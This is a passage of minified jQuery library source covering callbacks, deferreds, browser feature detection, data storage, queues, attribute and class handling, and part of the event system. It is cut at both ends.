href="#"></a>","#"===e.firstChild.getAttribute("href")})||ct("type|href|height|width",function(e,n,r){return r?t:e.getAttribute(n,"type"===n.toLowerCase()?1:2)}),r.attributes&&ut(function(e){return e.innerHTML="<input>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||ct("value",function(e,n,r){return r||"input"!==e.nodeName.toLowerCase()?t:e.defaultValue}),ut(function(e){return null==e.getAttribute("disabled")})||ct(B,function(e,n,r){var i;return r?t:(i=e.getAttributeNode(n))&&i.specified?i.value:e[n]===!0?n.toLowerCase():null}),x.find=at,x.expr=at.selectors,x.expr[":"]=x.expr.pseudos,x.unique=at.uniqueSort,x.text=at.getText,x.isXMLDoc=at.isXML,x.contains=at.contains}(e);var O={};function F(e){var t=O[e]={};return x.each(e.match(T)||[],function(e,n){t[n]=!0}),t}x.Callbacks=function(e){e="string"==typeof e?O[e]||F(e):x.extend({},e);var n,r,i,o,a,s,l=[],u=!e.once&&[],c=function(t){for(r=e.memory&&t,i=!0,a=s||0,s=0,o=l.length,n=!0;l&&o>a;a++)if(l[a].apply(t[0],t[1])===!1&&e.stopOnFalse){r=!1;break}n=!1,l&&(u?u.length&&c(u.shift()):r?l=[]:p.disable())},p={add:function(){if(l){var t=l.length;(function i(t){x.each(t,function(t,n){var r=x.type(n);"function"===r?e.unique&&p.has(n)||l.push(n):n&&n.length&&"string"!==r&&i(n)})})(arguments),n?o=l.length:r&&(s=t,c(r))}return this},remove:function(){return l&&x.each(arguments,function(e,t){var r;while((r=x.inArray(t,l,r))>-1)l.splice(r,1),n&&(o>=r&&o--,a>=r&&a--)}),this},has:function(e){return e?x.inArray(e,l)>-1:!(!l||!l.length)},empty:function(){return l=[],o=0,this},disable:function(){return l=u=r=t,this},disabled:function(){return!l},lock:function(){return u=t,r||p.disable(),this},locked:function(){return!u},fireWith:function(e,t){return!l||i&&!u||(t=t||[],t=[e,t.slice?t.slice():t],n?u.push(t):c(t)),this},fire:function(){return p.fireWith(this,arguments),this},fired:function(){return!!i}};return p},x.extend({Deferred:function(e){var t=[["resolve","done",x.Callbacks("once memory"),"resolved"],["reject","fail",x.Callbacks("once memory"),"rejected"],["notify","progress",x.Callbacks("memory")]],n="pending",r={state:function(){return n},always:function(){return i.done(arguments).fail(arguments),this},then:function(){var e=arguments;return x.Deferred(function(n){x.each(t,function(t,o){var a=o[0],s=x.isFunction(e[t])&&e[t];i[o[1]](function(){var e=s&&s.apply(this,arguments);e&&x.isFunction(e.promise)?e.promise().done(n.resolve).fail(n.reject).progress(n.notify):n[a+"With"](this===r?n.promise():this,s?[e]:arguments)})}),e=null}).promise()},promise:function(e){return null!=e?x.extend(e,r):r}},i={};return r.pipe=r.then,x.each(t,function(e,o){var a=o[2],s=o[3];r[o[1]]=a.add,s&&a.add(function(){n=s},t[1^e][2].disable,t[2][2].lock),i[o[0]]=function(){return i[o[0]+"With"](this===i?r:this,arguments),this},i[o[0]+"With"]=a.fireWith}),r.promise(i),e&&e.call(i,i),i},when:function(e){var t=0,n=g.call(arguments),r=n.length,i=1!==r||e&&x.isFunction(e.promise)?r:0,o=1===i?e:x.Deferred(),a=function(e,t,n){return function(r){t[e]=this,n[e]=arguments.length>1?g.call(arguments):r,n===s?o.notifyWith(t,n):--i||o.resolveWith(t,n)}},s,l,u;if(r>1)for(s=Array(r),l=Array(r),u=Array(r);r>t;t++)n[t]&&x.isFunction(n[t].promise)?n[t].promise().done(a(t,u,n)).fail(o.reject).progress(a(t,l,s)):--i;return i||o.resolveWith(u,n),o.promise()}}),x.support=function(t){var n,r,o,s,l,u,c,p,f,d=a.createElement("div");if(d.setAttribute("className","t"),d.innerHTML="  <link><table></table><a href="/a">a</a><input type="checkbox">",n=d.getElementsByTagName("*")||[],r=d.getElementsByTagName("a")[0],!r||!r.style||!n.length)return t;s=a.createElement("select"),u=s.appendChild(a.createElement("option")),o=d.getElementsByTagName("input")[0],r.style.cssText="top:1px;float:left;opacity:.5",t.getSetAttribute="t"!==d.className,t.leadingWhitespace=3===d.firstChild.nodeType,t.tbody=!d.getElementsByTagName("tbody").length,t.htmlSerialize=!!d.getElementsByTagName("link").length,t.style=/top/.test(r.getAttribute("style")),t.hrefNormalized="/a"===r.getAttribute("href"),t.opacity=/^0.5/.test(r.style.opacity),t.cssFloat=!!r.style.cssFloat,t.checkOn=!!o.value,t.optSelected=u.selected,t.enctype=!!a.createElement("form").enctype,t.html5Clone="<:nav></:nav>"!==a.createElement("nav").cloneNode(!0).outerHTML,t.inlineBlockNeedsLayout=!1,t.shrinkWrapBlocks=!1,t.pixelPosition=!1,t.deleteExpando=!0,t.noCloneEvent=!0,t.reliableMarginRight=!0,t.boxSizingReliable=!0,o.checked=!0,t.noCloneChecked=o.cloneNode(!0).checked,s.disabled=!0,t.optDisabled=!u.disabled;try{delete d.test}catch(h){t.deleteExpando=!1}o=a.createElement("input"),o.setAttribute("value",""),t.input=""===o.getAttribute("value"),o.value="t",o.setAttribute("type","radio"),t.radioValue="t"===o.value,o.setAttribute("checked","t"),o.setAttribute("name","t"),l=a.createDocumentFragment(),l.appendChild(o),t.appendChecked=o.checked,t.checkClone=l.cloneNode(!0).cloneNode(!0).lastChild.checked,d.attachEvent&&(d.attachEvent("onclick",function(){t.noCloneEvent=!1}),d.cloneNode(!0).click());for(f in{submit:!0,change:!0,focusin:!0})d.setAttribute(c="on"+f,"t"),t[f+"Bubbles"]=c in e||d.attributes[c].expando===!1;d.style.backgroundClip="content-box",d.cloneNode(!0).style.backgroundClip="",t.clearCloneStyle="content-box"===d.style.backgroundClip;for(f in x(t))break;return t.ownLast="0"!==f,x(function(){var n,r,o,s="padding:0;margin:0;border:0;display:block;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;",l=a.getElementsByTagName("body")[0];l&&(n=a.createElement("div"),n.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",l.appendChild(n).appendChild(d),d.innerHTML="<table><tr><td></td><td>t</td></tr></table>",o=d.getElementsByTagName("td"),o[0].style.cssText="padding:0;margin:0;border:0;display:none",p=0===o[0].offsetHeight,o[0].style.display="",o[1].style.display="none",t.reliableHiddenOffsets=p&&0===o[0].offsetHeight,d.innerHTML="",d.style.cssText="box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%;",x.swap(l,null!=l.style.zoom?{zoom:1}:{},function(){t.boxSizing=4===d.offsetWidth}),e.getComputedStyle&&(t.pixelPosition="1%"!==(e.getComputedStyle(d,null)||{}).top,t.boxSizingReliable="4px"===(e.getComputedStyle(d,null)||{width:"4px"}).width,r=d.appendChild(a.createElement("div")),r.style.cssText=d.style.cssText=s,r.style.marginRight=r.style.width="0",d.style.width="1px",t.reliableMarginRight=!parseFloat((e.getComputedStyle(r,null)||{}).marginRight)),typeof d.style.zoom!==i&&(d.innerHTML="",d.style.cssText=s+"width:1px;padding:1px;display:inline;zoom:1",t.inlineBlockNeedsLayout=3===d.offsetWidth,d.style.display="block",d.innerHTML="<div></div>",d.firstChild.style.width="5px",t.shrinkWrapBlocks=3!==d.offsetWidth,t.inlineBlockNeedsLayout&&(l.style.zoom=1)),l.removeChild(n),n=d=o=r=null)}),n=s=l=u=r=o=null,t}({});var B=/(?:\{[\s\S]*\}|\[[\s\S]*\])$/,P=/([A-Z])/g;function R(e,n,r,i){if(x.acceptData(e)){var o,a,s=x.expando,l=e.nodeType,u=l?x.cache:e,c=l?e[s]:e[s]&&s;if(c&&u[c]&&(i||u[c].data)||r!==t||"string"!=typeof n)return c||(c=l?e[s]=p.pop()||x.guid++:s),u[c]||(u[c]=l?{}:{toJSON:x.noop}),("object"==typeof n||"function"==typeof n)&&(i?u[c]=x.extend(u[c],n):u[c].data=x.extend(u[c].data,n)),a=u[c],i||(a.data||(a.data={}),a=a.data),r!==t&&(a[x.camelCase(n)]=r),"string"==typeof n?(o=a[n],null==o&&(o=a[x.camelCase(n)])):o=a,o}}function W(e,t,n){if(x.acceptData(e)){var r,i,o=e.nodeType,a=o?x.cache:e,s=o?e[x.expando]:x.expando;if(a[s]){if(t&&(r=n?a[s]:a[s].data)){x.isArray(t)?t=t.concat(x.map(t,x.camelCase)):t in r?t=[t]:(t=x.camelCase(t),t=t in r?[t]:t.split(" ")),i=t.length;while(i--)delete r[t[i]];if(n?!I(r):!x.isEmptyObject(r))return}(n||(delete a[s].data,I(a[s])))&&(o?x.cleanData([e],!0):x.support.deleteExpando||a!=a.window?delete a[s]:a[s]=null)}}}x.extend({cache:{},noData:{applet:!0,embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(e){return e=e.nodeType?x.cache[e[x.expando]]:e[x.expando],!!e&&!I(e)},data:function(e,t,n){return R(e,t,n)},removeData:function(e,t){return W(e,t)},_data:function(e,t,n){return R(e,t,n,!0)},_removeData:function(e,t){return W(e,t,!0)},acceptData:function(e){if(e.nodeType&&1!==e.nodeType&&9!==e.nodeType)return!1;var t=e.nodeName&&x.noData[e.nodeName.toLowerCase()];return!t||t!==!0&&e.getAttribute("classid")===t}}),x.fn.extend({data:function(e,n){var r,i,o=null,a=0,s=this[0];if(e===t){if(this.length&&(o=x.data(s),1===s.nodeType&&!x._data(s,"parsedAttrs"))){for(r=s.attributes;r.length>a;a++)i=r[a].name,0===i.indexOf("data-")&&(i=x.camelCase(i.slice(5)),$(s,i,o[i]));x._data(s,"parsedAttrs",!0)}return o}return"object"==typeof e?this.each(function(){x.data(this,e)}):arguments.length>1?this.each(function(){x.data(this,e,n)}):s?$(s,e,x.data(s,e)):null},removeData:function(e){return this.each(function(){x.removeData(this,e)})}});function $(e,n,r){if(r===t&&1===e.nodeType){var i="data-"+n.replace(P,"-$1").toLowerCase();if(r=e.getAttribute(i),"string"==typeof r){try{r="true"===r?!0:"false"===r?!1:"null"===r?null:+r+""===r?+r:B.test(r)?x.parseJSON(r):r}catch(o){}x.data(e,n,r)}else r=t}return r}function I(e){var t;for(t in e)if(("data"!==t||!x.isEmptyObject(e[t]))&&"toJSON"!==t)return!1;return!0}x.extend({queue:function(e,n,r){var i;return e?(n=(n||"fx")+"queue",i=x._data(e,n),r&&(!i||x.isArray(r)?i=x._data(e,n,x.makeArray(r)):i.push(r)),i||[]):t},dequeue:function(e,t){t=t||"fx";var n=x.queue(e,t),r=n.length,i=n.shift(),o=x._queueHooks(e,t),a=function(){x.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,a,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return x._data(e,n)||x._data(e,n,{empty:x.Callbacks("once memory").add(function(){x._removeData(e,t+"queue"),x._removeData(e,n)})})}}),x.fn.extend({queue:function(e,n){var r=2;return"string"!=typeof e&&(n=e,e="fx",r--),r>arguments.length?x.queue(this[0],e):n===t?this:this.each(function(){var t=x.queue(this,e,n);x._queueHooks(this,e),"fx"===e&&"inprogress"!==t[0]&&x.dequeue(this,e)})},dequeue:function(e){return this.each(function(){x.dequeue(this,e)})},delay:function(e,t){return e=x.fx?x.fx.speeds[e]||e:e,t=t||"fx",this.queue(t,function(t,n){var r=setTimeout(t,e);n.stop=function(){clearTimeout(r)}})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,n){var r,i=1,o=x.Deferred(),a=this,s=this.length,l=function(){--i||o.resolveWith(a,[a])};"string"!=typeof e&&(n=e,e=t),e=e||"fx";while(s--)r=x._data(a[s],e+"queueHooks"),r&&r.empty&&(i++,r.empty.add(l));return l(),o.promise(n)}});var z,X,U=/[\t\r\n\f]/g,V=/\r/g,Y=/^(?:input|select|textarea|button|object)$/i,J=/^(?:a|area)$/i,G=/^(?:checked|selected)$/i,Q=x.support.getSetAttribute,K=x.support.input;x.fn.extend({attr:function(e,t){return x.access(this,x.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){x.removeAttr(this,e)})},prop:function(e,t){return x.access(this,x.prop,e,t,arguments.length>1)},removeProp:function(e){return e=x.propFix[e]||e,this.each(function(){try{this[e]=t,delete this[e]}catch(n){}})},addClass:function(e){var t,n,r,i,o,a=0,s=this.length,l="string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).addClass(e.call(this,t,this.className))});if(l)for(t=(e||"").match(T)||[];s>a;a++)if(n=this[a],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(U," "):" ")){o=0;while(i=t[o++])0>r.indexOf(" "+i+" ")&&(r+=i+" ");n.className=x.trim(r)}return this},removeClass:function(e){var t,n,r,i,o,a=0,s=this.length,l=0===arguments.length||"string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).removeClass(e.call(this,t,this.className))});if(l)for(t=(e||"").match(T)||[];s>a;a++)if(n=this[a],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(U," "):"")){o=0;while(i=t[o++])while(r.indexOf(" "+i+" ")>=0)r=r.replace(" "+i+" "," ");n.className=e?x.trim(r):""}return this},toggleClass:function(e,t){var n=typeof e;return"boolean"==typeof t&&"string"===n?t?this.addClass(e):this.removeClass(e):x.isFunction(e)?this.each(function(n){x(this).toggleClass(e.call(this,n,this.className,t),t)}):this.each(function(){if("string"===n){var t,r=0,o=x(this),a=e.match(T)||[];while(t=a[r++])o.hasClass(t)?o.removeClass(t):o.addClass(t)}else(n===i||"boolean"===n)&&(this.className&&x._data(this,"__className__",this.className),this.className=this.className||e===!1?"":x._data(this,"__className__")||"")})},hasClass:function(e){var t=" "+e+" ",n=0,r=this.length;for(;r>n;n++)if(1===this[n].nodeType&&(" "+this[n].className+" ").replace(U," ").indexOf(t)>=0)return!0;return!1},val:function(e){var n,r,i,o=this[0];{if(arguments.length)return i=x.isFunction(e),this.each(function(n){var o;1===this.nodeType&&(o=i?e.call(this,n,x(this).val()):e,null==o?o="":"number"==typeof o?o+="":x.isArray(o)&&(o=x.map(o,function(e){return null==e?"":e+""})),r=x.valHooks[this.type]||x.valHooks[this.nodeName.toLowerCase()],r&&"set"in r&&r.set(this,o,"value")!==t||(this.value=o))});if(o)return r=x.valHooks[o.type]||x.valHooks[o.nodeName.toLowerCase()],r&&"get"in r&&(n=r.get(o,"value"))!==t?n:(n=o.value,"string"==typeof n?n.replace(V,""):null==n?"":n)}}}),x.extend({valHooks:{option:{get:function(e){var t=x.find.attr(e,"value");return null!=t?t:e.text}},select:{get:function(e){var t,n,r=e.options,i=e.selectedIndex,o="select-one"===e.type||0>i,a=o?null:[],s=o?i+1:r.length,l=0>i?s:o?i:0;for(;s>l;l++)if(n=r[l],!(!n.selected&&l!==i||(x.support.optDisabled?n.disabled:null!==n.getAttribute("disabled"))||n.parentNode.disabled&&x.nodeName(n.parentNode,"optgroup"))){if(t=x(n).val(),o)return t;a.push(t)}return a},set:function(e,t){var n,r,i=e.options,o=x.makeArray(t),a=i.length;while(a--)r=i[a],(r.selected=x.inArray(x(r).val(),o)>=0)&&(n=!0);return n||(e.selectedIndex=-1),o}}},attr:function(e,n,r){var o,a,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return typeof e.getAttribute===i?x.prop(e,n,r):(1===s&&x.isXMLDoc(e)||(n=n.toLowerCase(),o=x.attrHooks[n]||(x.expr.match.bool.test(n)?X:z)),r===t?o&&"get"in o&&null!==(a=o.get(e,n))?a:(a=x.find.attr(e,n),null==a?t:a):null!==r?o&&"set"in o&&(a=o.set(e,r,n))!==t?a:(e.setAttribute(n,r+""),r):(x.removeAttr(e,n),t))},removeAttr:function(e,t){var n,r,i=0,o=t&&t.match(T);if(o&&1===e.nodeType)while(n=o[i++])r=x.propFix[n]||n,x.expr.match.bool.test(n)?K&&Q||!G.test(n)?e[r]=!1:e[x.camelCase("default-"+n)]=e[r]=!1:x.attr(e,n,""),e.removeAttribute(Q?n:r)},attrHooks:{type:{set:function(e,t){if(!x.support.radioValue&&"radio"===t&&x.nodeName(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},propFix:{"for":"htmlFor","class":"className"},prop:function(e,n,r){var i,o,a,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return a=1!==s||!x.isXMLDoc(e),a&&(n=x.propFix[n]||n,o=x.propHooks[n]),r!==t?o&&"set"in o&&(i=o.set(e,r,n))!==t?i:e[n]=r:o&&"get"in o&&null!==(i=o.get(e,n))?i:e[n]},propHooks:{tabIndex:{get:function(e){var t=x.find.attr(e,"tabindex");return t?parseInt(t,10):Y.test(e.nodeName)||J.test(e.nodeName)&&e.href?0:-1}}}}),X={set:function(e,t,n){return t===!1?x.removeAttr(e,n):K&&Q||!G.test(n)?e.setAttribute(!Q&&x.propFix[n]||n,n):e[x.camelCase("default-"+n)]=e[n]=!0,n}},x.each(x.expr.match.bool.source.match(/\w+/g),function(e,n){var r=x.expr.attrHandle[n]||x.find.attr;x.expr.attrHandle[n]=K&&Q||!G.test(n)?function(e,n,i){var o=x.expr.attrHandle[n],a=i?t:(x.expr.attrHandle[n]=t)!=r(e,n,i)?n.toLowerCase():null;return x.expr.attrHandle[n]=o,a}:function(e,n,r){return r?t:e[x.camelCase("default-"+n)]?n.toLowerCase():null}}),K&&Q||(x.attrHooks.value={set:function(e,n,r){return x.nodeName(e,"input")?(e.defaultValue=n,t):z&&z.set(e,n,r)}}),Q||(z={set:function(e,n,r){var i=e.getAttributeNode(r);return i||e.setAttributeNode(i=e.ownerDocument.createAttribute(r)),i.value=n+="","value"===r||n===e.getAttribute(r)?n:t}},x.expr.attrHandle.id=x.expr.attrHandle.name=x.expr.attrHandle.coords=function(e,n,r){var i;return r?t:(i=e.getAttributeNode(n))&&""!==i.value?i.value:null},x.valHooks.button={get:function(e,n){var r=e.getAttributeNode(n);return r&&r.specified?r.value:t},set:z.set},x.attrHooks.contenteditable={set:function(e,t,n){z.set(e,""===t?!1:t,n)}},x.each(["width","height"],function(e,n){x.attrHooks[n]={set:function(e,r){return""===r?(e.setAttribute(n,"auto"),r):t}}})),x.support.hrefNormalized||x.each(["href","src"],function(e,t){x.propHooks[t]={get:function(e){return e.getAttribute(t,4)}}}),x.support.style||(x.attrHooks.style={get:function(e){return e.style.cssText||t},set:function(e,t){return e.style.cssText=t+""}}),x.support.optSelected||(x.propHooks.selected={get:function(e){var t=e.parentNode;return t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex),null}}),x.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){x.propFix[this.toLowerCase()]=this}),x.support.enctype||(x.propFix.enctype="encoding"),x.each(["radio","checkbox"],function(){x.valHooks[this]={set:function(e,n){return x.isArray(n)?e.checked=x.inArray(x(e).val(),n)>=0:t}},x.support.checkOn||(x.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})});var Z=/^(?:input|select|textarea)$/i,et=/^key/,tt=/^(?:mouse|contextmenu)|click/,nt=/^(?:focusinfocus|focusoutblur)$/,rt=/^([^.]*)(?:\.(.+)|)$/;function it(){return!0}function ot(){return!1}function at(){try{return a.activeElement}catch(e){}}x.event={global:{},add:function(e,n,r,o,a){var s,l,u,c,p,f,d,h,g,m,y,v=x._data(e);if(v){r.handler&&(c=r,r=c.handler,a=c.selector),r.guid||(r.guid=x.guid++),(l=v.events)||(l=v.events={}),(f=v.handle)||(f=v.handle=function(e){return typeof x===i||e&&x.event.triggered===e.type?t:x.event.dispatch.apply(f.elem,arguments)},f.elem=e),n=(n||"").match(T)||[""],u=n.length;while(u--)s=rt.exec(n[u])||[],g=y=s[1],m=(s[2]||"").split(".").sort(),g&&(p=x.event.special[g]||{},g=(a?p.delegateType:p.bindType)||g,p=x.event.special[g]||{},d=x.extend({type:g,origType:y,data:o,handler:r,guid:r.guid,selector:a,needsContext:a&&x.expr.match.needsContext.test(a),namespace:m.join(".")},c),(h=l[g])||(h=l[g]=[],h.delegateCount=0,p.setup&&p.setup.call(e,o,m,f)!==!1||(e.addEventListener?e.addEventListener(g,f,!1):e.attachEvent&&e.attachEvent("on"+g,f))),p.add&&(p.add.call(e,d),d.handler.guid||(d.handler.guid=r.guid)),a?h.splice(h.delegateCount++,0,d):h.push(d),x.event.global[g]=!0);e=null}},remove:function(e,t,n,r,i){var o,a,s,l,u,c,p,f,d,h,g,m=x.hasData(e)&&x._data(e);if(m&&(c=m.events)){t=(t||"").match(T)||[""],u=t.length;while(u--)if(s=rt.exec(t[u])||[],d=g=s[1],h=(s[2]||"").split(".").sort(),d){p=x.event.special[d]||{},d=(r?p.delegateType:p.bindType)||d,f=c[d]||[],s=s[2]&&RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),l=o=f.length;while(o--)a=f[o],!i&&g!==a.origType||n&&n.guid!==a.guid||s&&!s.test(a.namespace)||r&&r!==a.selector&&("**"!==r||!a.selector)||(f.splice(o,1),a.selector&&f.delegateCount--,p.remove&&p.remove.call(e,a));l&&!f.length&&(p.teardown&&p.teardown.call(e,h,m.handle)!==!1||x.removeEvent(e,d,m.handle),delete c[d])}else for(d in c)x.event.remove(e,d+t[u],n,r,!0);x.isEmptyObject(c)&&(delete m.handle,x._removeData(e,"events"))}},trigger:function(n,r,i,o){var s,l,u,c,p,f,d,h=[i||a],g=v.call(n,"type")?n.type:n,m=v.call(n,"namespace")?n.namespace.split("."):[];if(u=f=i=i||a,3!==i.nodeType&&8!==i.nodeType&&!nt.test(g+x.event.triggered)&&(g.indexOf(".")>=0&&(m=g.split("."),g=m.shift(),m.sort()),l=0>g.indexOf(":")&&"on"+g,n=n[x.expando]?n:new x.Event(g,"object"==typeof n&&n),n.isTrigger=o?2:3,n.namespace=m.join("."),n.namespace_re=n.namespace?RegExp("(^|\\.)"+m.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,n.result=t,n.target||(n.target=i),r=null==r?[n]:x.makeArray(r,[n]),p=x.event.special[g]||{},o||!p.trigger||p.trigger.apply(i,r)!==!1)){if(!o&&!p.noBubble&&!x.isWindow(i)){for(c=p.delegateType||g,nt.test(c+g)||(u=u.parentNode);u;u=u.parentNode)h.push(u),f=u;f===(i.ownerDocument||a)&&h.push(f.defaultView||f.parentWindow||e)}d=0;while((u=h[d++])&&!n.isPropagationStopped())n.type=d>1?c:p.bindType||g,s=(x._data(u,"events")||{})[n.type]&&x._data(u,"handle"),s&&s.apply(u,r),s=l&&u[l],s&&x.acceptData(u)&&s.apply&&s.apply(u,r)===!1&&n.preventDefault();if(n.type=g,!o&&!n.isDefaultPrevented()&&(!p._default||p._default.apply(h.pop(),r)===!1)&&x.acceptData(i)&&l&&i[g]&&!x.isWindow(i)){f=i[l],f&&(i[l]=null),x.event.triggered=g;try{i[g]()}catch(y){}x.event.triggered=t,f&&(i[l]=f)}return n.result}},dispatch:function(e){e=x.event.fix(e);var n,r,i,o,a,s=[],l=g.call(arguments),u=(x._data(this,"events")||{})[e.type]||[],c=x.event.special[e.type]||{};if(l[0]=e,e.delegateTarget=this,!c.preDispatch||c.preDispatch.call(this,e)!==!1){s=x.event.handlers.call(this,e,u),n=0;while((o=s[n++])&&!e.isPropagationStopped()){e.currentTarget=o.elem,a=0;while((i=o.handlers[a++])&&!e.isImmediatePropagationStopped())(!e.namespace_re||e.namespace_re.test(i.namespace))&&(e.handleObj=i,e.data=i.data,r=((x.event.special[i.origType]||{}).handle||i.handler).apply(o.elem,l),r!==t&&(e.result=r)===!1&&(e.preventDefault(),e.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,e),e.result}},handlers:function(e,n){var r,i,o,a,s=[],l=n.delegateCount,u=e.target;if(l&&u.nodeType&&(!e.button||"click"!==e.type))for(;u!=this;u=u.parentNode||this)if(1===u.nodeType&&(u.disabled!==!0||"click"!==e.type)){for(o=[],a=0;l>a;a++)i=n[a],r=i.selector+" ",o[r]===t&&(o[r]=i.needsContext?x(r,this).index(u)>=0:x.find(r,this,null,[u]).length),o[r]&&o.push(i);o.length&&s.push({elem:u,handlers:o})}return n.length>l&&s.push({elem:this,handlers:n.slice(l)}),s},fix:function(e){if(e[x.expando])return e;var t,n,r,i=e.type,o=e,s=this.fixHooks[i];s||(this.fixHooks[i]=s=tt.test(i)?this.mouseHooks:et.test(i)?this.keyHooks:{}),r=s.props?this.props.concat(s.props):this.props,e=new x.Event(o),t=r.length;while(t--)n=r[t],e[n]=o[n];return e.target||(e.target=o.srcElement||a),3===e.target.nodeType&&(e.target=e.target.parentNode),e.metaKey=!!e.metaKey,s.filter?s.filter(e,o):e},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(e,t){return null==e.which&&(e.which=null!=t.charCode?t.charCode:t.keyCode),e}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(e,n){var r,i,o,s=n.button,l=n.fromElement;return null==e.pageX&&null!=n.clientX&&(i=e.target.ownerDocument||a,o=i.documentElement,r=i.body,e.pageX=n.clientX+(o&&o.scrollLeft||r&&r.scrollLeft||0)-(o&&o.clientLeft||r&&r.clientLeft||0),e.pageY=n.clientY+(o&&o.scrollTop||r&&r.scrollTop||0)-(o&&o.clientTop||r&&r.clientTop||0)),!e.relatedTarget&&l&&(e.relatedTarget=l===e.target?n.toElement:l),e.which||s===t||(e.which=1&s?1:2&s?3:4&s?2:0),e}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==at()&&this.focus)try{return this.focus(),!1}catch(e){}},delegateType:"focusin"},blur:{trigger:function(){return this===at()&&this.blur?(this.blur(),!1):t},delegateType:"focusout"},click:{trigger:function(){return x.nodeName(this,"input")&&"checkbox"===this.type&&this.click?(this.click(),!1):t},_default:function(e){return x.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){e.result!==t&&(e.originalEvent.returnValue=e.result)}}},simulate:function(e,t,n,r){var i=x.extend(new x.Event,n,{type:e,isSimulated:!0,originalEvent:{}});r?x.event.trigger(i,null,t):x.event.dispatch.call(t,i),i.isDefaultPrevented()&&n.preventDefault()}},x.removeEvent=a.removeEventListener?function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n,!1)}:function(e,t,n){var r="on"+t;e.detachEvent&&(typeof e[r]===i&&(e[r]=null),e.detachEvent(r,n))},x.Event=function(e,n){return this instanceof x.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||e.returnValue===!1||e.getPreventDefault&&e.getPreventDefault()?it:ot):this.type=e,n&&x.extend(this,n),this.timeStamp=e&&e.timeStamp||x.now(),this[x.expando]=!0,t):new x.Event(e,n)},x.Event.prototype={isDefaultPrevented:ot,isPropagationStopped:ot,isImmediatePropagationStopped:ot,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=it,e&&(e.preventDefault?e.preventDefault():e.returnValue=!1)},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=it,e&&(e.stopPropagation&&e.stopPropagation(),e.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=it,this.stopPropagation()}},x.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(e,t){x.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return(!i||i!==r&&!x.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),x.support.submitBubbles||(x.event.special.submit={setup:function(){return x.nodeName(this,"form")?!1:(x.event.add(this,"click._submit keypress._submit",function(e){var n=e.target,r=x.nodeName(n,"input")||x.nodeName(n,"button")?n.form:t;r&&!x._data(r,"submitBubbles")&&(x.event.add(r,"submit._submit",function(e){e._submit_bubble=!0}),x._data(r,"submitBubbles",!0))}),t)},postDispatch:function(e){e._submit_bubble&&(delete e._submit_bubble,this.parentNode&&!e.isTrigger&&x.event.simulate("submit",this.parentNode,e,!0))},teardown:function(){return x.nodeName(this,"form")?!1:(x.event.remove(this,"._submit"),t)}}),x.support.changeBubbles||(x.event.special.change={setup:function(){return Z.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(x.event.add(this,"propertychange._change",function(e){"checked"===e.originalEvent.propertyName&&(this._just_changed=!0)}),x.event.add(this,"click._change",function(e){this._just_changed&&!e.isTrigger&&(this._just_changed=!1),x.event.simulate("change",this,e,!0)})),!1):(x.event.add(this,"beforeactivate._change",function(e){var t=e.target;Z.test(t.nodeName)&&!x._data(t,"changeBubbles")&&(x.event.add(t,"change._change",function(e){!this.parentNode||e.isSimulated||e.isTrigger||x.event.simulate("change",this.parentNode,e,!0)}),x._data(t,"changeBubbles",!0))}),t)},handle:function(e){var n=e.target;return this!==n||e.isSimulated||e.isTrigger||"radio"!==n.type&&"checkbox"!==n.type?e.handleObj.handler.apply(this,arguments):t},teardown:function(){return x.event.remove(this,"._change"),!Z.test(this.nodeName)}}),x.support.focusinBubbles||x.each({focus:"focusin",blur:"focusout"},function(e,t){var n=0,r=function(e){x.event.simulate(t,e.target,x.event.fix(e),!0)};x.event.special[t]={setup:function(){0===n++&&a.addEventListener(e,r,!0)},teardown:function(){0===--n&&a.removeEventListener(e,r,!0)}}}),x.fn.extend({on:function(e,n,r,i,o){var a,s;if("object"==typeof e){"string"!=typeof n&&(r=r||n,n=t);for(a in e)this.on(a,n,r,e[a],o);return this}if(null==r&&null==i?(i=n,r=n=t):null==i&&("string"==typeof n?(i=r,r=t):(i=r,r=n,n=t)),i===!1)i=ot;else if(!i)return this;return 1===o&&(s=i,i=function(e){return 